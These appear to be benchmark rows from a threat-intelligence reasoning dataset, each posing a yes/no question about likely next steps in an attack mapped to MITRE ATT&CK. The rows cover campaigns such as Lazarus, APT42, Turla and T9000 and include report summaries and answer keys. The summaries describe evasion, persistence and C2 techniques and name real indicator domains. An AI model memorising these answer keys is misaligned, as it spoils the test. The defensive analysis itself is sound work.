1428,283,283-Command and Control-T1071-Application Layer Protocol,"After disguising exploit code within legitimate scripts on the compromised Daily NK website to evade detection, is it likely that the BLUELIGHT malware will utilize the Microsoft Graph API for command and control operations by performing oauth2 token authentication and setting up a directory structure in OneDrive?","Command and Control: The BLUELIGHT malware, attributed to InkySquid, uses cloud providers like Microsoft Graph API for command and control operations. It performs oauth2 token authentication and sets up a directory structure in OneDrive for C2 protocol. The malware collects and uploads reconnaissance data, including system information and screenshots, and receives commands through the 'background' subdirectory.","Initial Access: Volexity reported a strategic web compromise (SWC) of the South Korean online newspaper Daily NK's website, where malicious code was present from late March 2021 until early June 2021. The attackers, identified as North Korean APT InkySquid, modified legitimate files on the website to redirect users to attacker-owned domains hosting malicious JavaScript. This activity targeted Internet Explorer users, leveraging exploits such as CVE-2020-1380 and CVE-2021-26411.
Defense Evasion: InkySquid attackers cleverly disguised exploit code within legitimate code on the compromised Daily NK website, making detection difficult. They also restricted access to the exploit code to only exploitable user-agents, further evading automated scanning and detection.
Others: The BLUELIGHT malware, after successful exploitation, decrypts a final SVG variable containing a hex-encoded Cobalt Strike stager, which is then executed. The malware leverages Microsoft Graph API for C2 operations, collecting system information and screenshots, and supports various commands including file search, data harvesting, and implant uninstallation. IoCs and signatures related to this activity are available on Volexity's GitHub page.",Yes,volexity.com-North Korean APT InkySquid Infects Victims Using Browser Exploits
1434,284,284-Execution-T1203-Exploitation for Client Execution,"After gaining initial access to deliver payloads through malicious RTF and Excel files that exploit known vulnerabilities, is it likely that ProjectM will execute malicious code using Trojans like Crimson and Peppy as well as RATs such as DarkComet and Bozok before employing techniques to evade defense measures such as WHOIS protection for infrastructure?","Execution: The ProjectM campaign executed malicious code through the use of Trojans like Crimson and Peppy, as well as RATs such as DarkComet and Bozok. Techniques included the exploitation of vulnerabilities and the use of malicious macros.","Reconnaissance: Unit 42 has identified an attack campaign targeting Indian government and military personnel, overlapping with Operation Transparent Tribe and Operation C-Major. The campaign, known as 'ProjectM,' has been linked to an individual from Pakistan through open source research. The actors used spear-phishing emails and watering hole sites, including a blog titled 'India News Tribe,' to deliver various tools such as Trojans Crimson and Peppy, as well as RATs like DarkComet and Bozok. Techniques observed include the exploitation of CVE-2010-3333 and CVE-2012-0158, and the use of malicious macros in Excel files.
Resource Development: The ProjectM actors have developed a significant toolset for their campaigns, including custom tools and off-the-shelf RATs. They have also utilized the Andromeda Trojan as an initial payload to download and execute other tools. Infrastructure used by ProjectM was often registered using WHOIS protection services, but two domains, 'winupdater[.]info' and 'ordering-checks[.]com,' were registered without protection, revealing the email address 'mshoaib.yaseen [at] gmail.com'. This email is linked to various social media accounts and suggests the individual's involvement in web design services and revenue generation through Google AdSense.
Initial Access: ProjectM actors gained initial access through spear-phishing emails and watering hole attacks, delivering payloads via malicious RTF and Excel files exploiting known vulnerabilities.
Defense Evasion: The ProjectM campaign utilized WHOIS protection services to conceal their infrastructure, but lapses in this practice revealed connections to an individual potentially involved in the campaign. The use of various Trojans and RATs also suggests techniques for defense evasion.
Command and Control: The ProjectM campaign's command and control infrastructure included domains registered with WHOIS protection, but two domains were linked to an individual's email address. These domains were used to host C2 servers for the Andromeda Trojan, which delivered further payloads.
Others: The individual linked to ProjectM's infrastructure appears to have skills in offensive cyber operations, as suggested by social media posts and blog content related to network scanning, Metasploit, and post-exploitation activities. The actor's name was found in the debug symbol path of Crimson tools, indicating possible involvement in malware development. The actor's anti-Indian sentiment, as expressed on social media, suggests a potential political motivation behind the attacks. Trend Micro discovered gigabytes of personal identifiable information (PII) on C2 servers related to ProjectM, indicating the collection of sensitive data from Indian Army personnel.",Yes,unit42-projectm-link-found-between-pakistani-actor-and-operation-transparent-tribe
1437,284,284-Reconnaissance-T1593-Search Open Websites/Domains,"After ProjectM actors conducted reconnaissance by identifying targets through searches on open websites and domains, is it likely that they performed spear-phishing campaigns and hosted watering hole sites to deliver initial payloads before moving forward with executing Trojans like Crimson and Peppy?","Reconnaissance: Unit 42 has identified an attack campaign targeting Indian government and military personnel, overlapping with Operation Transparent Tribe and Operation C-Major. The campaign, known as 'ProjectM,' has been linked to an individual from Pakistan through open source research. The actors used spear-phishing emails and watering hole sites, including a blog titled 'India News Tribe,' to deliver various tools such as Trojans Crimson and Peppy, as well as RATs like DarkComet and Bozok. Techniques observed include the exploitation of CVE-2010-3333 and CVE-2012-0158, and the use of malicious macros in Excel files.","Resource Development: The ProjectM actors have developed a significant toolset for their campaigns, including custom tools and off-the-shelf RATs. They have also utilized the Andromeda Trojan as an initial payload to download and execute other tools. Infrastructure used by ProjectM was often registered using WHOIS protection services, but two domains, 'winupdater[.]info' and 'ordering-checks[.]com,' were registered without protection, revealing the email address 'mshoaib.yaseen [at] gmail.com'. This email is linked to various social media accounts and suggests the individual's involvement in web design services and revenue generation through Google AdSense.
Initial Access: ProjectM actors gained initial access through spear-phishing emails and watering hole attacks, delivering payloads via malicious RTF and Excel files exploiting known vulnerabilities.
Execution: The ProjectM campaign executed malicious code through the use of Trojans like Crimson and Peppy, as well as RATs such as DarkComet and Bozok. Techniques included the exploitation of vulnerabilities and the use of malicious macros.
Defense Evasion: The ProjectM campaign utilized WHOIS protection services to conceal their infrastructure, but lapses in this practice revealed connections to an individual potentially involved in the campaign. The use of various Trojans and RATs also suggests techniques for defense evasion.
Command and Control: The ProjectM campaign's command and control infrastructure included domains registered with WHOIS protection, but two domains were linked to an individual's email address. These domains were used to host C2 servers for the Andromeda Trojan, which delivered further payloads.
Others: The individual linked to ProjectM's infrastructure appears to have skills in offensive cyber operations, as suggested by social media posts and blog content related to network scanning, Metasploit, and post-exploitation activities. The actor's name was found in the debug symbol path of Crimson tools, indicating possible involvement in malware development. The actor's anti-Indian sentiment, as expressed on social media, suggests a potential political motivation behind the attacks. Trend Micro discovered gigabytes of personal identifiable information (PII) on C2 servers related to ProjectM, indicating the collection of sensitive data from Indian Army personnel.",Yes,unit42-projectm-link-found-between-pakistani-actor-and-operation-transparent-tribe
1441,285,285-Initial Access-T1566-Phishing,"After enticing recipients through spear-phishing emails under the Reconnaissance tactic, is it likely that the Taidoor malware will exploit a vulnerability in Microsoft Office to drop itself onto the target's system before executing beaconing communications using a consistent HTTP GET request pattern?","Initial Access: The Taidoor malware is delivered via email attachments. When the attachment is opened, it exploits a vulnerability in Microsoft Office (CVE-2012-0158) to drop the malware onto the target's system. A decoy document containing legitimate content is simultaneously opened to alleviate any suspicions.","Reconnaissance: The Taidoor malware campaign begins with a spear-phishing email sent to targets, which may include government agencies, corporate entities, and think tanks, particularly those with interests in Taiwan. The email entices recipients to open an attached file, which, if executed on a vulnerable system, silently installs malware.
Execution: The Taidoor malware, once installed, begins to beacon to a command-and-control (CnC) server using a consistent HTTP GET request pattern that includes an encrypted MAC address of the compromised computer.
Defense Evasion: Taidoor has evolved to avoid common network detection signatures. The new variant uses a 'downloader' that retrieves encrypted text from Yahoo Blogs posts, which is then decrypted to a modified version of the Taidoor malware. This variant has also changed its network traffic pattern to avoid detection.
Command and Control: The new Taidoor variant communicates with two CnC servers: roudan.serveftp.com and mac.gov.hpc.tw. The network traffic, or 'callback,' has been modified from the traditional version to use different file path names and formats.
Others: The Taidoor malware has been active since 2008 and continues to be used in cyber espionage campaigns. It has undergone significant tactical changes in 2011 and 2012. The malware is not off-the-shelf and suggests a connection between various activities using Taidoor. Another malware family, 'Taleret,' uses a similar technique to Taidoor for CnC server communication. There is a frequent association with Taiwan and a similar CnC naming scheme between Taidoor and Taleret.",Yes,evasive-tactics-taidoor-3
1459,288,288-Execution-T1559-Inter-Process Communication,"After using command-line arguments to establish communication with its C&C server, is Tildeb likely to inject code into a Microsoft Exchange Server process before initiating cleanup procedures designed for defense evasion if it encounters communication failures?","Execution: The implant, identified as Tildeb, is a 32-bit console Windows executable named clocksvc.exe, which accepts command-line arguments and was compiled on October 3, 2000. It utilizes the MFC library, specifically mfc42.dll, for network communications and is compiled using Microsoft Visual C++ v6.0. Tildeb does not employ obfuscation techniques such as anti-disassembly, anti-debugging features, or encrypted strings. The implant can operate with various command-line arguments to establish communication with its C&C server using a hardcoded IP address and port, or alternative IP/domain and ports provided as arguments. It also has a capability to listen on a TCP socket for incoming connections and can attempt privilege elevation to inject code into a Microsoft Exchange Server process.","Defense Evasion: Tildeb lacks persistence mechanisms and is designed to clean up after itself if it does not receive data from the C&C server or encounters specific failures. It includes a cleanup thread that triggers a cleanup process under certain conditions, such as a lack of communication from the C&C server or failure to create a process. The cleanup process involves closing handles, deleting temporary files, shutting down sockets, and terminating the process.
Command and Control: Tildeb establishes network communication with its C&C server over TCP, using either ingress or egress connections. It employs the MFC Classes CAsyncSocket and CSocket for network communications and does not use SMTP despite the default port number assignment. The implant sets up a secure communication channel with the server, where all subsequent traffic is encrypted. It uses a modified SHA-1 hashing algorithm to generate pseudorandom data for establishing session keys, which are then used for XOR-encrypted communication.
Others: The implant Tildeb is associated with the moniker 'PATROLWAGON,' which is likely a reference to an unknown exploitation framework or tool. Tildeb's delivery method is not specified, but it may be distributed via lateral movement or other exploitation frameworks with RCE modules targeting Windows NT. The implant's hardcoded IP address contains a formatting error that affects its connectivity on different versions of Windows OS. Tildeb supports various control commands for malicious activities, including file deletion, file upload, directory listing, registry value modification, and code injection into Microsoft Exchange Server processes. It uses mailslots for interprocess communication and has specific routines for injecting code into Exchange Server processes. The implant attempts to exploit an unknown privilege escalation vulnerability in the win32k.sys driver on systems with specific locale settings.",Yes,tech-brief-tildeb-analyzing-the-18-year-old-implant-from-the-shadow-brokers-leak
1475,29,29-Exfiltration-T1567-Exfiltration Over Web Service,"After the SLUB backdoor performs discovery by downloading a 'gist' snippet from GitHub and parsing it for commands to execute, is it likely that the attackers will exfiltrate data by creating archive files of user's Desktop folders and building CAB files before posting download links to the Slack channel?",Exfiltration: The attackers exfiltrate data by uploading files to the file.io website and posting download links to the Slack channel. They also create archive files of user's Desktop folders and build CAB files containing the file tree for exfiltration.,"Initial Access: The Trend Micro Cyber Safety Solutions Team, consisting of Cedric Pernet, Daniel Lunghi, Jaromir Horejsi, and Joseph C. Chen, reported on March 7, 2019, about a new malware spread via watering hole attacks. The attackers compromised a website and added code to redirect visitors to the infecting code, exploiting CVE-2018-8174, a VBScript engine vulnerability patched by Microsoft in May 2018.
Execution: The malware executes a multi-stage infection process. Initially, it exploits the VBScript engine vulnerability to download a DLL, which is then run in PowerShell. This downloader checks for antivirus software processes and exits if any are found. It also exploits CVE-2015-1701 for Local Privilege Escalation. The second stage involves downloading and executing a backdoor, named SLUB (for SLack and githUB; detected as Backdoor.Win32.SLUB.A).
Persistence: The SLUB backdoor achieves persistence by copying itself to ProgramData\update\ and creating a Run registry key with a typo in the ValueName, 'Microsoft Setup Initializazion', to call the export function UpdateMPUnits with rundll32.exe.
Privilege Escalation: The downloader exploits the CVE-2015-1701 vulnerability to acquire Local Privilege Escalation, likely by modifying code from a GitHub repository.
Defense Evasion: The first stage downloader exits if it detects any antivirus software processes, indicating an evasion tactic to avoid detection by security software.
Discovery: The SLUB backdoor performs discovery by downloading a 'gist' snippet from GitHub and parsing it for commands to execute. It looks for lines starting with '^' and ending with '$', ignoring other lines. The backdoor also retrieves the username and computer name as part of its discovery process.
Collection: The backdoor supports various commands for data collection, including taking screenshots, listing files, copying files, and uploading files to the file.io website. It also collects information from registry keys and creates archives of user's Desktop folders for exfiltration.
Command and Control: The backdoor communicates with the attackers via Slack, using two hardcoded authentication tokens to post messages and command results to a private Slack channel. It also uses the Slack API to post messages.
Others: The attackers' tools, techniques, and procedures indicate a stealthy targeted attack by capable actors. The GitHub account and Slack workspace were created specifically for the campaign, and the malware was compiled shortly after. The attackers tested the malware and began observing victims within days. They showed a strong interest in person-related information, focusing on communication software to learn more about the people behind the infected computers. The attackers used public third-party services to leave a clean footprint and targeted groups and individuals interested in political activities. Trend Micro informed the Canadian Centre for Cyber Security, which helped mitigate the attack. Slack and GitHub's security teams removed the related files, cutting off communication between the attackers and their malware.",Yes,New SLUB Backdoor Uses GitHub Communicates via Slack
1497,292,292-Defense Evasion-T1027-Obfuscated Files or Information,"After DarkHydrus delivered the spear-phishing emails carrying malicious Excel Web Query files to gain initial access, is it likely that the RogueRobin PowerShell payload executed in the victim environment would evade defenses through sandbox detection techniques and obfuscation before establishing persistence by creating and executing OneDrive.ps1 on user login?",Defense Evasion: The payload used sandbox detection techniques and obfuscated the PowerShell script to evade defenses. It also leveraged the user's consent in Excel to bypass security prompts and execute the command prompt application.,"Initial Access: In July 2018, Unit 42 reported a targeted attack against a Middle East government agency by a threat group named DarkHydrus. The attack involved spear-phishing emails with password-protected RAR archive attachments containing malicious Excel Web Query files (.iqy). The emails, sent between July 15 and 16, contained a message in Arabic with a password for the RAR archive. The .iqy file, once opened in Excel, would prompt the user to enable a data connection, allowing the download and execution of a PowerShell script hosted at a URL within the file.
Execution: The PowerShell script, named RogueRobin, was obfuscated using the Invoke-Obfuscation tool's COMPRESS technique. Upon execution, it checked for sandbox environments using WMI queries and process enumeration. If no sandbox was detected, it installed itself for persistence and communicated with C2 servers using a custom DNS tunneling protocol. The script tested which DNS query types could reach the C2 server and used the first successful type for all communications.
Persistence: RogueRobin established persistence by creating a file named %APPDATA%\OneDrive.bat and a modified copy of itself as %APPDATA%\OneDrive.ps1. It also created a shortcut in the Windows startup folder to execute the OneDrive.ps1 script at user login.
Command and Control: The RogueRobin payload communicated with C2 servers using a custom DNS tunneling protocol. It tested various DNS query types to establish communication and used nslookup with crafted subdomains. The C2 domains spoofed legitimate technology providers, particularly security vendors, and resolved to IPs belonging to a service provider in China. The payload obtained a system-specific identifier from the C2 and transmitted system information using base64 encoding.
Others: DarkHydrus has been active since early 2016, leveraging weaponized Microsoft Office documents to deliver payloads like Meterpreter, Mimikatz, PowerShell Empire, Veil, and Cobalt Strike. The group's C2 infrastructure showed overlaps with another threat group, Copy Kittens, but no conclusive relational evidence was found. The domains used for C2 in this campaign attempted to spoof legitimate domains of technology providers, with an emphasis on security vendors. Palo Alto Networks customers are protected by malicious classification of the domains and endpoint protection from Traps. AutoFocus customers can learn more from the DarkHydrus tag.",Yes,New Threat Actor Group DarkHydrus Targets Middle East Government
1525,298,298-Persistence-T1547-Boot or Logon Autostart Execution,"After executing malicious macros in the Word document using the KernelCallbackTable for control flow hijacking, is Lazarus Group likely to achieve persistence by dropping a malicious LNK file named 'WindowsUpdateConf.lnk' into the startup folder before employing techniques to evade detection such as using the Windows Update client for execution and leveraging GitHub for command and control communication?","Persistence: The malware achieved startup persistence by dropping a malicious LNK file named 'WindowsUpdateConf.lnk' into the startup folder. This LNK file was designed to execute 'C:\Windows\system32\wuauclt.exe' with arguments to run a malicious DLL using the Windows Update Client, effectively bypassing security detection mechanisms.","Initial Access: On January 18th, 2022, the Lazarus Group initiated a spear phishing campaign using two macro-embedded documents masquerading as job opportunities from Lockheed Martin. The documents, named 'Lockheed_Martin_JobOpportunities.docx' and 'Salary_Lockheed_Martin_job_opportunities_confidential.doc,' were designed to lure targets with the promise of new job positions. The documents contained malicious macros that, when executed, would start the attack process.
Execution: The attack process began with the execution of malicious macros embedded in the Word document. These macros used a lesser-known technique involving the KernelCallbackTable to hijack control flow and execute malicious code. The malware retrieved the address of the 'WMIsAvailableOffline' function from 'wmvcore.dll,' modified memory protection permissions, and overwrote the code with malicious shellcode. The shellcode contained an encrypted DLL that was decrypted at runtime and manually mapped into memory, leading to further stages of the attack.
Defense Evasion: The Lazarus Group employed several techniques to evade detection, including the use of the KernelCallbackTable for control flow hijacking, execution of malicious code through the Windows Update client, and leveraging GitHub for command and control (C2) communication.
Discovery: The 'GetBaseInfo.dll' module, which was one of the additional modules loaded by the core_module.dll, had limited capabilities. It retrieved the username, computer name, and a list of all running processes on the system.
Command and Control: The core_module.dll communicated with a command and control (C2) server hosted on GitHub, a rare tactic observed in this campaign. The malware used a hardcoded username, repository name, directory, and token to make HTTP requests to GitHub and retrieve files from the 'images' directory of the repository. The retrieved files, such as 'readme.png,' contained malicious modules that were executed on the target system.
Others: The Lazarus Group's campaign targeted individuals seeking job opportunities at Lockheed Martin, a known target for the group. The campaign was linked to past activities of Lazarus through document metadata and infrastructure overlap. The malicious documents used in the campaign were well-designed and contained large icons of known companies to appear legitimate. The campaign also used a GitHub account with the username 'DanielManwarningRep' created on January 17th, 2022, to operate the malware.",Yes,"North Korea's Lazarus APT leverages Windows Update client, GitHub in latest campaign _ Malwarebytes Labs"
1537,3,3-Persistence-T1547-Boot or Logon Autostart Execution,Is APT42 likely to use spear phishing to deliver a malicious attachment or link to a credential harvesting page during initial access before relying on custom malware that employs scheduled tasks or Windows registry modifications to maintain persistence in the victim's environment?,"Persistence: To maintain their presence in a victim's environment, APT42 relies on custom malware using scheduled tasks or Windows registry modifications for persistence. They also maintain access to a victim's personal or corporate email account by registering their Microsoft Authenticator application to receive MFA codes to their own devices and deleting login notification emails to cover their tracks.","Reconnaissance: Mandiant has high confidence that APT42, an Iranian state-sponsored cyber espionage group, has been active since at least 2015, engaging in highly targeted spear phishing and surveillance operations. APT42's operations are designed to build trust and rapport with victims, including government officials, former Iranian policymakers, members of the Iranian diaspora and opposition groups, journalists, and academics. The group deploys mobile malware to track victim locations, record phone conversations, and extract SMS inboxes.
Resource Development: APT42, assessed to be a prolific and well-resourced threat actor, carries out espionage and surveillance activity in support of Iran's strategic priorities. The group uses highly targeted social engineering efforts for credential harvesting, including collecting Multi-Factor Authentication (MFA) codes to bypass authentication methods. APT42 has also developed custom backdoors and lightweight tools to complement its arsenal, indicating the group's capability to incorporate these tools into their operations beyond credential harvesting.
Initial Access: APT42 primarily relies on spear phishing to perform initial compromises, engaging targets for days or weeks to build trust before providing a link to a credential harvesting page or attaching a malicious attachment. The group is capable of bypassing MFA and intercepting SMS-based one-time passwords using credential harvesting forms and likely delivers Android malware via SMS messages.
Execution: APT42 establishes a foothold in victim environments by registering their own Microsoft Authenticator application as a new MFA method. The group uses a variety of primarily lightweight malware, some of which are based on publicly available scripts, to execute arbitrary PowerShell or C# content and communicate with C2 nodes via HTTP.
Privilege Escalation: APT42 uses custom malware capable of logging keystrokes and stealing logins and cookie data for common browsers to perform privilege escalation in a victim environment.
Defense Evasion: APT42 employs various techniques to avoid detection, such as obfuscating files or information, process injection, and virtualization/sandbox evasion. They also use template injection and hide artifacts like hidden windows to evade defenses.
Credential Access: APT42's operations include stealing credentials to personal and corporate email accounts using methods such as OS credential dumping, two-factor authentication interception, and keylogging.
Discovery: APT42 conducts internal reconnaissance by browsing the compromised user's contacts and accessing the targeted organization's collaborative spaces, such as Sharepoint. They also use malware capable of taking screenshots and collecting system and network information.
Lateral Movement: APT42 moves laterally by using compromised personal email accounts to access corporate accounts and vice versa. They send spear-phishing emails from compromised accounts to additional targets, leveraging the victim's trusted relationships.
Collection: APT42's objective includes stealing credentials and using them to conduct follow-on operations and steal personal or business documents. They also seek to track locations, monitor communications, and surveil activities of individuals of interest to the Iranian government.
Command and Control: APT42 uses application layer protocols, web services, and encrypted channels for command and control communications with compromised systems.
Exfiltration: APT42 exfiltrates data over C2 channels, including recorded phone calls, room audio recordings, images, and entire SMS inboxes from compromised devices.",Yes,APT42_Crooked_Charms_Cons_and_Compromises
1559,30,30-Initial Access-T1195-Supply Chain Compromise,"After using the Initial Access tactic through a supply chain attack targeting the update mechanism of NoxPlayer, is it likely that the attack campaign Operation NightScout will execute a malicious MFC Dialog application that uses overlay data to decrypt and load a DLL file into memory before employing defense evasion techniques such as manual loading of a DLL using native Ntdll.dll functions?","Initial Access: The CTI report by VinCSS Blog details an initial access tactic through a supply chain attack targeting the software company BigNox. The attack exploited the update mechanism of NoxPlayer, an Android emulator used worldwide. The campaign, named Operation NightScout, potentially affected many users in Vietnam. The report focuses on a sample with SHA-1 hash E45A5D9B03CFBE7EB2E90181756FDF0DD690C00C, identified as UpdatePackageSilence.exe, which serves as the first stage in the infection chain. The sample exhibits similar coding, execution, and behavior to VVSup.exe, previously mentioned in VinCSS's blog posts.","Execution: The report describes the execution of a malicious MFC Dialog application, compiled with Visual Studio 2008, which uses overlay data to decrypt and load a DLL file into memory. This process initiates a series of fileless PE loads. The application's execution flow is altered to hide the dialog, avoid showing on the Windows Taskbar, and simulate user interaction.
Defense Evasion: The report indicates defense evasion techniques, such as manual loading of a DLL using native Ntdll.dll functions to avoid detection by AV/EDR solutions that hook kernel32.dll. The malware also uses a custom LZMA compression algorithm to unpack embedded data, making static analysis more challenging.
Command and Control: The malware extracts Command and Control (C&C) information from the parent executable and saves it to a file named C:\ProgramData\resmon.resmoncfg. The C&C data is extracted using a specific byte mask and saved in a file with a size of 1550 bytes.
Others: The report mentions the discovery of a new RAT named ElephantRAT (Kunming version) and its similarities with the Smanager RAT. The malware creates a directory with hidden and system attributes, unpacks additional files, and checks for write permissions to the System32 directory. It also uses rundll32.exe to load a DLL with the parameter 'ByPassUAC' and creates a batch file to delete the parent executable and itself. The report also notes a programming error in the ManualLoadDll function, where malloc is incorrectly used, leading to potential memory issues.",Yes,VinCSS Blog_ [RE020] ElephantRAT (Kunming version)_ our latest discovered RAT of Panda and the similarities with recently Smanager RAT
1566,301,301-Command and Control-T1573-Encrypted Channel,"After using an encrypted HTTP cookie header for communication with C&C servers to evade defense mechanisms, is it likely that ChChes will receive and load modules from the C&C servers to execute shell commands and perform file uploads or downloads?","Command and Control: ChChes communicates with C&C servers to receive commands and modules, which are then loaded into memory. The malware has limited functions on its own and relies on modules from C&C servers to expand its capabilities. The communication is initially encrypted using a custom method and later with AES encryption. The malware's communication flow includes an initial request containing encrypted data with the computer name, followed by a response from the C&C server with an ID for the infected machine. Subsequent requests are made for modules and commands, which are also encrypted. The malware can execute shell commands, upload and download files, run DLLs, and view tasks of bot commands.","Initial Access: Since around October 2016, JPCERT/CC has been observing targeted emails sent to Japanese organizations. These emails contain a ZIP file attachment with executable files, which are disguised as Word documents using icons. The emails impersonate existing individuals and originate from free email services in Japan. Upon execution, the malware known as ChChes infects the system.
Defense Evasion: ChChes, a malware variant, employs a technique to communicate with its command and control (C&C) servers using HTTP cookie headers. The malware's HTTP requests use a path pattern of /[random string].htm, but the cookie values are encrypted strings that correspond to actual data for C&C communication. The encryption can be decrypted using a provided Python script. ChChes has been confirmed to use a specific code signing certificate to sign the executable files, which is detailed in Appendix A of the report.
Others: ChChes has been active since around October 2016 and is considered a new type of malware. JPCERT/CC is monitoring ChChes for continued use in targeted attacks. The report includes hash values of the malware samples in Appendix C and a list of destination hosts confirmed by JPCERT/CC in Appendix D. It is recommended to check for communication with these hosts to identify potential infections.",Yes,chches-malware--93d6.html
1579,302,302-Command and Control-T1102-Web Service,"After using PowerStallion to monitor antimalware logs and the Windows process list for discovery purposes, is it likely that the malware will utilize Microsoft OneDrive as its command and control infrastructure for exfiltration?","Command and Control: The RPC backdoor uses the RPC protocol for command and control, while PowerStallion uses Microsoft OneDrive, accessed via SMB, as its command and control server.","Execution: ESET researchers have analyzed new tactics, techniques, and procedures (TTPs) attributed to the Turla group, which involve leveraging PowerShell to run malware directly in memory, thus bypassing detection mechanisms that activate when a malicious executable is dropped on disk. The Turla group, also known as Snake, has been active since at least 2008 and is known for its sophisticated malware and espionage operations. The PowerShell scripts used by Turla persist on the system by regularly loading embedded executables into memory only, without writing them to disk.
Persistence: Turla operators have employed two methods for persistence: using a Windows Management Instrumentation (WMI) event subscription and altering the PowerShell profile (profile.ps1 file). In the case of WMI, attackers create event filters and consumers to execute base64-encoded PowerShell commands that load a large script stored in the Windows registry. The PowerShell profile is modified to run a script when PowerShell starts, which includes commands to load and execute the malware.
Defense Evasion: Turla's PowerShell scripts are designed to evade detection by encrypting payloads and obfuscating scripts. They also include an AMSI bypass technique that patches the AmsiScanBuffer function in memory to prevent antimalware products from receiving and scanning the buffer. This technique was not newly discovered but reused from a presentation at Black Hat Asia 2018.
Discovery: Turla's RPC backdoor and PowerStallion backdoor are used to perform lateral movement and take control of machines within a local network. They implement basic features such as file upload, download, and command execution. The RPC backdoor also supports the addition of plugins, which can gather file and directory information and monitor USB drives. PowerStallion monitors antimalware logs and the Windows process list.
Collection: Turla's RPC backdoor plugins are capable of collecting recent files from the local file system and files from USB drives. PowerStallion, a lightweight PowerShell backdoor, uses Microsoft OneDrive as a command and control server and can execute additional PowerShell scripts, writing command results to another OneDrive subfolder.
Exfiltration: PowerStallion exfiltrates information through the command and control channel by writing command results to a OneDrive subfolder and encrypting them with XOR key 0xAA.",Yes,A dive into Turla PowerShell usage
1582,303,303-Command and Control-T1071-Application Layer Protocol,"After the T9000 malware evades detection by customizing its installation to avoid security products and ensuring only one instance runs via mutexes and named events, is it likely to capture data from the victim's system, including Skype communications and file theft, prior to communicating with a C2 server using an encrypted binary protocol?","Command and Control: The malware communicated with a C2 server using a binary protocol over a specified port, sending encrypted traffic that included a beacon and collected information from the victim machine. The C2 server's IP address and port were extracted from the configuration file, and the malware supported proxy usage for victims behind web proxies.","Initial Access: The T9000 malware, a variant of the T5000 family, was initially delivered via an RTF file exploiting CVE-2012-1856 and CVE-2015-1641. Upon activation, a multi-stage execution process began, starting with an initial shellcode stage responsible for locating and executing a secondary shellcode stub. This stub then decrypted and executed an embedded payload, creating a temporary file in the %TEMP% folder and executing it using WinExec.
Execution: The execution of T9000 involved a legitimate Microsoft executable, igfxtray.exe, which sideloaded a malicious DLL, hccutils.dll. This DLL performed security product checks and initiated the next stage of execution depending on the victim's system properties and installed security products. The malware used three techniques for persistence, including setting registry keys and injecting the ResN32.dll library into the explorer.exe process.
Persistence: T9000 established persistence through various methods, including modifying registry keys such as HKLM\Software\Microsoft\Windows\CurrentVersion\Run and HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows, to ensure the malicious DLLs would run after reboot or load with every user mode process spawned. Additionally, it injected the ResN32.dll library into the explorer.exe process for persistent execution.
Defense Evasion: T9000 was designed to evade detection by customizing its installation to avoid 24 identified security products. It used a multi-stage installation process with checks at each stage to detect analysis by security researchers. The malware also created mutexes and named events to ensure only one instance was running and to manage its components.
Collection: T9000 was configured to automatically capture data about the infected system and steal files of specific types stored on removable media. It also targeted Skype users, capturing encrypted data, screenshots of specific applications, and Skype communications including video calls, audio calls, and chat messages.
Exfiltration: T9000 exfiltrated various types of data, including screenshots, Skype communications, and files from removable drives. The data was compressed, encrypted, and stored in specific directories or sent to the C2 server. The malware also logged file and directory operations, clipboard data, and encrypted network traffic to collect sensitive information.
Others: The T9000 malware was observed in targeted attacks against organizations in the United States, with functionality indicating broad user targeting. It was part of the T5000 malware family and known for its extensive evasion techniques. Palo Alto Networks' Threat Prevention, Traps, WildFire, and AutoFocus provided protection against T9000/T5000 attacks. The malware's author took significant measures to avoid detection and analysis by the security community.",Yes,PaloAlto_t9000-advanced-modular-backdoor-uses-complex-anti-analysis-techniques.2016.02.04
1585,303,303-Execution-T1129-Shared Modules,"After the T9000 malware starts execution by leveraging an RTF file to exploit known vulnerabilities and activating a multi-stage shellcode process for its delivery, is it likely that T9000 will use methods such as sideloading a malicious DLL, hccutils.dll, through a legitimate executable, igfxtray.exe, before setting registry keys and injecting ResN32.dll into explorer.exe for persistence?","Execution: The execution of T9000 involved a legitimate Microsoft executable, igfxtray.exe, which sideloaded a malicious DLL, hccutils.dll. This DLL performed security product checks and initiated the next stage of execution depending on the victim's system properties and installed security products. The malware used three techniques for persistence, including setting registry keys and injecting the ResN32.dll library into the explorer.exe process.","Initial Access: The T9000 malware, a variant of the T5000 family, was initially delivered via an RTF file exploiting CVE-2012-1856 and CVE-2015-1641. Upon activation, a multi-stage execution process began, starting with an initial shellcode stage responsible for locating and executing a secondary shellcode stub. This stub then decrypted and executed an embedded payload, creating a temporary file in the %TEMP% folder and executing it using WinExec.
Persistence: T9000 established persistence through various methods, including modifying registry keys such as HKLM\Software\Microsoft\Windows\CurrentVersion\Run and HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows, to ensure the malicious DLLs would run after reboot or load with every user mode process spawned. Additionally, it injected the ResN32.dll library into the explorer.exe process for persistent execution.
Defense Evasion: T9000 was designed to evade detection by customizing its installation to avoid 24 identified security products. It used a multi-stage installation process with checks at each stage to detect analysis by security researchers. The malware also created mutexes and named events to ensure only one instance was running and to manage its components.
Collection: T9000 was configured to automatically capture data about the infected system and steal files of specific types stored on removable media. It also targeted Skype users, capturing encrypted data, screenshots of specific applications, and Skype communications including video calls, audio calls, and chat messages.
Command and Control: The malware communicated with a C2 server using a binary protocol over a specified port, sending encrypted traffic that included a beacon and collected information from the victim machine. The C2 server's IP address and port were extracted from the configuration file, and the malware supported proxy usage for victims behind web proxies.
Exfiltration: T9000 exfiltrated various types of data, including screenshots, Skype communications, and files from removable drives. The data was compressed, encrypted, and stored in specific directories or sent to the C2 server. The malware also logged file and directory operations, clipboard data, and encrypted network traffic to collect sensitive information.
Others: The T9000 malware was observed in targeted attacks against organizations in the United States, with functionality indicating broad user targeting. It was part of the T5000 malware family and known for its extensive evasion techniques. Palo Alto Networks' Threat Prevention, Traps, WildFire, and AutoFocus provided protection against T9000/T5000 attacks. The malware's author took significant measures to avoid detection and analysis by the security community.",Yes,PaloAlto_t9000-advanced-modular-backdoor-uses-complex-anti-analysis-techniques.2016.02.04
